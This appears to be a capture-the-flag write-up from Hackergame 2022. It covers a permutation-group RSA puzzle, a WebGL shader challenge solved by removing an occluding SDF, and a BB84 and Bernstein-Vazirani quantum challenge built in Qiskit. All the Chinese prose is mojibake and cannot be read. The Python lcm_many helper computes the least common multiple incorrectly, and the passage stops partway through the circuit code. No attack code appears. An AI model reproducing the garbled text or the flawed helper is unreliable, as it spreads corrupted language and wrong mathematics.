<p>å› ä¸ºå»å¹´ Hackergame åšè¿‡ RSA ç›¸å…³çš„é¢˜ç›®ï¼Œçœ‹åˆ°ç¬¬ä¸€é—®è¿˜æ˜¯æ¯”è¾ƒäº²åˆ‡çš„ã€‚</p>
<p>é¢˜ç›®æ„æ€æ¢³ç†ä¸€ä¸‹ï¼š</p>
<p>å·²çŸ¥ $n, e, secret^e$ ï¼Œå…¶ä¸­ $512 \le n &lt; 1024, e = 65537(\mathrm{is\ prime}), secret \in A_n$ ï¼Œæ±‚ $secret$</p>
<p>åœ¨ RSA ä¸­ï¼ŒåŠ å¯†å’Œè§£å¯†ä½¿ç”¨çš„å¼å­ï¼š</p>
<p>$$
c = m^e \mod n\\
m = c^d \mod n
$$</p>
<p>ä¹Ÿå³ $(m^{e})^d = m \mod n$ ã€‚</p>
<p>è¿™ä¸ªé¢˜ä¹Ÿæ˜¯ä¸€æ ·ï¼Œæ‰¾åˆ°ä¸€ä¸ª $d$ ï¼Œä½¿å¾— $(secret^{e})^d = secret$ å³å¯ã€‚</p>
<p>æ¢è¨€ä¹‹ï¼Œè®° $fac$ ä¸º $secret$ çš„é˜¶ï¼Œå³ $secret^{fac} = I_n$ ï¼Œé‚£ä¹ˆ $de = k\times fac + 1$ ã€‚</p>
<p>å¦‚æœ $secret^{e}$ çš„é˜¶ä¸º $f$ ï¼Œå³ $f$ æ˜¯æ»¡è¶³ $secret^{ef} = I_n$ çš„æœ€å°æ­£æ•°ï¼Œç”±äº $e$ æ˜¯ç´ æ•°ä¸” $e &gt; n$ ï¼Œé‚£ä¹ˆ $f$ ä¸€å®šæ˜¯ $fac$ çš„æ•´æ•°å€ã€‚</p>
<p>å› æ­¤é—®é¢˜è½¬åŒ–ä¸ºæ±‚ $secret^{e}$ çš„é˜¶ $f$ ï¼Œç„¶åæšä¸¾ $k$ æ±‚å‡º $d = (kf + 1)/e$ çš„æ•´æ•°è§£ï¼Œé‚£ä¹ˆç­”æ¡ˆå°±æ˜¯ $(secret^{e})^{d}$ã€‚</p>
<p>é¦–å…ˆç¬”è€…å¸¸æ•°äº†æš´åŠ›æšä¸¾ $f$ ï¼Œç»“æœ $n &gt; 100$ å°±è·‘ä¸åŠ¨äº†ã€‚</p>
<p>è€ƒè™‘åˆ°ä¸€æ¬¡ç½®æ¢å¯ä»¥æ‹†æˆè‹¥å¹²ä¸ªä¸å¯å†æ‹†çš„å°ç½®æ¢ï¼Œæ±‚åŸç½®æ¢çš„é˜¶ $f$ ï¼Œå®é™…ä¸Šå°±æ˜¯æ±‚è®©æ‰€æœ‰å°ç½®æ¢å‡è¿›è¡Œ $f$ æ¬¡åï¼Œåˆšå¥½å…¨éƒ¨å˜ä¸º $I$ ã€‚</p>
<p>è€Œè¿™äº›ä¸å¯å†æ‹†çš„å°ç½®æ¢çš„é˜¶ï¼Œæ­£æ˜¯å®ƒä»¬çš„é•¿åº¦ã€‚</p>
<p>æ±‚æ‰€æœ‰ä¸å¯å†æ‹†çš„å°ç½®æ¢çš„é•¿åº¦çš„æœ€å°å…¬å€æ•°ï¼Œå³å¯å¾—åˆ°åŸç½®æ¢çš„é˜¶ã€‚</p>
<p>ä»£ç å¦‚ä¸‹</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> numpy
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> permutation_group <span style="color:#f92672">import</span> permutation_element
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">gcd_many</span>(s):
</span></span><span style="display:flex;"><span>    g <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(s)):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>            g <span style="color:#f92672">=</span> s[i]
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            g <span style="color:#f92672">=</span> numpy<span style="color:#f92672">.</span>math<span style="color:#f92672">.</span>gcd(g, s[i])
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> g
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">lcm_many</span>(s) <span style="color:#f92672">-&gt;</span> int:
</span></span><span style="display:flex;"><span>    gcd <span style="color:#f92672">=</span> gcd_many(s)
</span></span><span style="display:flex;"><span>    ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> num <span style="color:#f92672">in</span> s:
</span></span><span style="display:flex;"><span>        ret <span style="color:#f92672">*=</span> num <span style="color:#f92672">/</span> gcd
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> int(ret)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>e <span style="color:#f92672">=</span> <span style="color:#ae81ff">65537</span>
</span></span><span style="display:flex;"><span>secrete <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>S <span style="color:#f92672">=</span> permutation_element(len(secrete), secrete)
</span></span><span style="display:flex;"><span>SS <span style="color:#f92672">=</span> S<span style="color:#f92672">.</span>standard_tuple
</span></span><span style="display:flex;"><span>res <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> m <span style="color:#f92672">in</span> SS:
</span></span><span style="display:flex;"><span>    res<span style="color:#f92672">.</span>append(len(m))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>fac <span style="color:#f92672">=</span> lcm_many(res)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>I <span style="color:#f92672">=</span> S<span style="color:#f92672">**</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>SI <span style="color:#f92672">=</span> S<span style="color:#f92672">**</span>fac
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">assert</span> SI <span style="color:#f92672">==</span> I
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;res = &#34;</span>, res)
</span></span><span style="display:flex;"><span>nfac <span style="color:#f92672">=</span> fac <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> nfac <span style="color:#f92672">%</span> e <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>    nfac <span style="color:#f92672">+=</span> fac
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;nfac: &#34;</span>, int(nfac))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>d <span style="color:#f92672">=</span> int(nfac <span style="color:#f92672">/</span> e)
</span></span><span style="display:flex;"><span>print(d)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sol <span style="color:#f92672">=</span> S<span style="color:#f92672">**</span>d
</span></span><span style="display:flex;"><span>sss <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> sol<span style="color:#f92672">.</span>permutation_list:
</span></span><span style="display:flex;"><span>    sss <span style="color:#f92672">+=</span> str(x) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; &#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(sss)
</span></span></code></pre></div><p><code>tty</code> å¯¹æ¯è¡Œè¾“å…¥çš„é•¿åº¦æœ‰é™åˆ¶ï¼Œå¯¼è‡´ç›´æ¥ç”¨ <code>list</code> è¾“å‡º <code>sol</code> ç­”æ¡ˆé•¿åº¦ä¼šè¶…ï¼Œè¢«æˆªæ–­ï¼Œè¿™ä¸ªé—®é¢˜å›°æ‰°äº†ç¬”è€…å¥½ä¹…ã€‚ã€‚ã€‚</p>
<h2 id="å…‰ä¸å½±">å…‰ä¸å½±</h2>
<p>ç‚¹å¼€ä¸€çœ‹ï¼ŒWebGL ï¼Œè¿™æˆ‘ç†Ÿæ‚‰ã€‚</p>
<p>æ¸²æŸ“å‡ºæ¥ç»“æœæ˜¯ flag å››ä¸ªå­—æ¯ï¼Œç„¶ååé¢çš„å†…å®¹è¢«ä¸€ä¸ªæ¿å­æŒ¡ä½äº†ã€‚</p>
<p>ç›´æ¥æŠŠç½‘é¡µè¿å¸¦ç€å››ä¸ª JS ä»£ç ä¸‹è½½åˆ°æœ¬åœ°ã€‚</p>
<p>å…ˆçœ‹çœ‹ä¸¤ä¸ª Shader ï¼Œ<code>vertexShader</code> é‡Œæ²¡ä»€ä¹ˆå¥½çœ‹çš„ï¼Œè·³è¿‡ã€‚</p>
<p><code>fragmentShader</code> é‡Œé¢æœ‰å¥½å‡ ä¸ªéå¸¸å¯ç–‘çš„ <code>SDF</code> å‡½æ•°ï¼Œå¹¶ä¸”åœ¨ <code>sceneSDF</code> å‡½æ•°ä¸­çœ‹åˆ°è¿™äº› <code>SDF</code> å‡½æ•°è¢«è°ƒç”¨ï¼Œ</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">float</span> <span style="color:#a6e22e">sceneSDF</span>(vec3 p, out vec3 pColor) {
</span></span><span style="display:flex;"><span>	pColor <span style="color:#f92672">=</span> <span style="color:#a6e22e">vec3</span>(<span style="color:#ae81ff">1.0</span>, <span style="color:#ae81ff">1.0</span>, <span style="color:#ae81ff">1.0</span>);
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	vec4 pH <span style="color:#f92672">=</span> <span style="color:#a6e22e">mk_homo</span>(p);
</span></span><span style="display:flex;"><span>	vec4 pTO <span style="color:#f92672">=</span> <span style="color:#a6e22e">mk_trans</span>(<span style="color:#ae81ff">35.0</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">5.0</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">20.0</span>) <span style="color:#f92672">*</span> <span style="color:#a6e22e">mk_scale</span>(<span style="color:#ae81ff">1.5</span>, <span style="color:#ae81ff">1.5</span>, <span style="color:#ae81ff">1.0</span>) <span style="color:#f92672">*</span> pH;
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">float</span> t1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">t1SDF</span>(pTO.xyz);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">float</span> t2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">t2SDF</span>((<span style="color:#a6e22e">mk_trans</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">45.0</span>, <span style="color:#ae81ff">0.0</span>, <span style="color:#ae81ff">0.0</span>) <span style="color:#f92672">*</span> pTO).xyz);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">float</span> t3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">t3SDF</span>((<span style="color:#a6e22e">mk_trans</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">80.0</span>, <span style="color:#ae81ff">0.0</span>, <span style="color:#ae81ff">0.0</span>) <span style="color:#f92672">*</span> pTO).xyz);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">float</span> t4 <span style="color:#f92672">=</span> <span style="color:#a6e22e">t4SDF</span>((<span style="color:#a6e22e">mk_trans</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">106.0</span>, <span style="color:#ae81ff">0.0</span>, <span style="color:#ae81ff">0.0</span>) <span style="color:#f92672">*</span> pTO).xyz);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">float</span> t5 <span style="color:#f92672">=</span> <span style="color:#a6e22e">t5SDF</span>(p <span style="color:#f92672">-</span> <span style="color:#a6e22e">vec3</span>(<span style="color:#ae81ff">36.0</span>, <span style="color:#ae81ff">10.0</span>, <span style="color:#ae81ff">15.0</span>), <span style="color:#a6e22e">vec3</span>(<span style="color:#ae81ff">30.0</span>, <span style="color:#ae81ff">5.0</span>, <span style="color:#ae81ff">5.0</span>), <span style="color:#ae81ff">2.0</span>);
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">float</span> tmin <span style="color:#f92672">=</span> <span style="color:#a6e22e">min</span>(<span style="color:#a6e22e">min</span>(<span style="color:#a6e22e">min</span>(<span style="color:#a6e22e">min</span>(t1, t2), t3), t4), t5);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> tmin;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>å¾ˆå®¹æ˜“è”æƒ³åˆ°ï¼Œè¿™äº› <code>SDF</code> é‡Œé¢æœ‰ä¸€ä¸ªæ˜¯ç”¨æ¥é®æŒ¡ flag å†…å®¹çš„ã€‚</p>
<p>æŠŠäº”ä¸ª <code>SDF</code> ä¾æ¬¡å»æ‰æµ‹è¯•ï¼Œå‘ç° <code>t5SDF</code> å³ä¸ºé®æŒ¡ç‰©ï¼Œå¾—åˆ° flag</p>
<p>
  <p><img src="https://s2.loli.net/2022/10/29/wlM5IbyA69BKJGW.png" alt="20221027_20.png" loading="lazy" onclick="showBig(this)"/></p>
</p>
<h2 id="é‡å­è—å®å›¾">é‡å­è—å®å›¾</h2>
<p>å†™å®Œ WP å›æ¥ä¹‹ååšçš„ç¬¬ä¸€ä¸ª math ã€‚</p>
<p>å…ˆå»æœ BB84 çš„é‡å­å¯†é’¥åˆ†å‘åè®®ï¼Œçœ‹åˆ°çŸ¥ä¹ä¸Šæœ‰ç¯‡æ–‡ç« æŒºè¯¦ç»†çš„ <a href="https://zhuanlan.zhihu.com/p/22474140" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/22474140</a></p>
<p>å¤§è‡´äº†è§£ BB84 ä¹‹åå°±èƒ½çŸ¥é“ï¼Œç¬¬ä¸€é—®å¡«å†™åˆ¶å¤‡åŸºåº•å’Œé‡å­æ€ï¼Œç„¶åå¯¹æ–¹ç»™å‡ºæµ‹é‡åŸºåº•ã€‚</p>
<p>æµ‹é‡åŸºåº•ä¸­å’Œåˆ¶å¤‡åŸºåº•ç›¸åŒçš„ä½ç½®ä¿ç•™ï¼Œä¸ç›¸åŒçš„ä½ç½®èˆå¼ƒã€‚</p>
<p>å¯†é’¥å°±æ˜¯ä¿ç•™ä¸‹æ¥çš„ä½ç½®å¯¹åº”çš„é‡å­æ€ã€‚</p>
<p>ä¸ºäº†æ–¹ä¾¿ï¼Œåˆ¶å¤‡åŸºåº•é€‰æ‹© 512 ä¸ª <code>+</code> ï¼Œé‡å­æ€é€‰æ‹© 512 ä¸ª <code>0</code> ã€‚</p>
<p>å¾—åˆ°æµ‹é‡åŸºåº•åï¼Œç»Ÿè®¡æµ‹é‡åŸºåº•ä¸­å«æœ‰å¤šå°‘ä¸ª <code>+</code> ï¼Œå°±ä¿ç•™å¤šå°‘ä¸ª <code>0</code> ä½œä¸ºå®‰å…¨å¯†é’¥ã€‚</p>
<p>å¼€å¯ç¬¬äºŒé—®ï¼Œç»™å‡ºäº†ä¸€å¼ é‡å­ç”µè·¯å›¾ï¼Œæç¤ºæ˜¯ Bernstein-Vazirani ç®—æ³•ï¼Œå¹¶ä¸”ç»™å‡ºäº†ä¸€ä¸ªå‚è€ƒé“¾æ¥ã€‚</p>
<p>
  <p><img src="https://s2.loli.net/2022/10/29/xXsuOhEelR9P8q1.png" alt="20221027_21.png" loading="lazy" onclick="showBig(this)"/></p>
</p>
<p>å»æœäº†ä¸€åœˆ Bernstein-Vazirani ç®—æ³•ï¼Œçœ‹åˆ°ä¼¼ä¹å¯ä»¥ç›´æ¥ä½¿ç”¨ QPanda æˆ–è€… Qiskit ä»£ç æŠŠç”µè·¯å›¾ç”»å‡ºæ¥ç„¶åè¿è¡Œå¾—åˆ°ç»“æœã€‚</p>
<p>äºæ˜¯å°±å¼€å§‹äº†æ¼«é•¿çš„é…ç¯å¢ƒä¹‹è·¯ï¼Œç¬”è€…æœ€å¼€å§‹é€‰æ‹©äº† QPanda ï¼Œç»“æœè¢« FreeStyle Matplot ç­‰åº“æ©„æ¦„äº†ã€‚</p>
<p>ç™½å¿™æ´»äº†ä¿©å°æ—¶ä¹‹ååˆå»æŠ•å¥” Qiskit ï¼Œåšå‡ºå¦‚ä¸‹ä»£ç ï¼ˆé—¨å…¨éƒ¨æ‰‹åŠ¨è¾“å…¥ï¼Œä¸ç„¶è¿˜èƒ½åšä¸ªè¯†å›¾ç¨‹åºç›´æ¥æŠŠå›¾è½¬ä»£ç ï¼Ÿï¼‰</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># initialization</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> matplotlib.pyplot <span style="color:#66d9ef">as</span> plt
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> numpy <span style="color:#66d9ef">as</span> np
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># importing Qiskit</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> qiskit <span style="color:#f92672">import</span> IBMQ, Aer
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> qiskit.providers.ibmq <span style="color:#f92672">import</span> least_busy
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> qiskit <span style="color:#f92672">import</span> QuantumCircuit, ClassicalRegister, QuantumRegister, transpile, assemble
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># import basic plot tools</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> qiskit.visualization <span style="color:#f92672">import</span> plot_histogram
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>n <span style="color:#f92672">=</span> <span style="color:#ae81ff">128</span> <span style="color:#75715e"># number of qubits used to represent s</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># We need a circuit with n qubits, plus one auxiliary qubit</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Also need n classical bits to write the output to</span>
</span></span><span style="display:flex;"><span>bv_circuit <span style="color:#f92672">=</span> QuantumCircuit(n <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>, n)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># put auxiliary in state |-&gt;</span>
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>h(n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>z(n)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Apply Hadamard gates before querying the oracle</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(n):
</span></span><span style="display:flex;"><span>    bv_circuit<span style="color:#f92672">.</span>h(i)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Apply barrier</span>
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>barrier()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Apply the inner-product oracle</span>
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">0</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>z(<span style="color:#ae81ff">4</span>)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>x(<span style="color:#ae81ff">6</span>)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>x(<span style="color:#ae81ff">15</span>)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>z(<span style="color:#ae81ff">30</span>)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>x(<span style="color:#ae81ff">38</span>)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>x(<span style="color:#ae81ff">40</span>)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>x(<span style="color:#ae81ff">44</span>)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>x(<span style="color:#ae81ff">46</span>)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>x(<span style="color:#ae81ff">70</span>)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>x(<span style="color:#ae81ff">90</span>)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>x(<span style="color:#ae81ff">92</span>)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>z(<span style="color:#ae81ff">96</span>)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>z(<span style="color:#ae81ff">121</span>)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>x(<span style="color:#ae81ff">123</span>)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">2</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>z(<span style="color:#ae81ff">6</span>)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>x(<span style="color:#ae81ff">15</span>)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>x(<span style="color:#ae81ff">40</span>)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>x(<span style="color:#ae81ff">46</span>)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>x(<span style="color:#ae81ff">70</span>)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>x(<span style="color:#ae81ff">90</span>)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>z(<span style="color:#ae81ff">96</span>)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>z(<span style="color:#ae81ff">121</span>)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>x(<span style="color:#ae81ff">123</span>)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">3</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">4</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>z(<span style="color:#ae81ff">4</span>)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">5</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">6</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>z(<span style="color:#ae81ff">6</span>)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">8</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>x(<span style="color:#ae81ff">6</span>)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">9</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">13</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">14</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">16</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">19</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">20</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">21</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">24</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">26</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">29</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">30</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>z(<span style="color:#ae81ff">30</span>)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">34</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">37</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">38</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>x(<span style="color:#ae81ff">38</span>)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">44</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>x(<span style="color:#ae81ff">44</span>)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">45</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">48</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">52</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">53</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">56</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">58</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">61</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">62</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">64</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">66</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">68</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">69</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">72</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">73</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">76</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">77</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">80</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">85</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">86</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">88</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">89</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">91</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">92</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>x(<span style="color:#ae81ff">92</span>)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">93</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">94</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">96</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">97</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">98</span>, n)
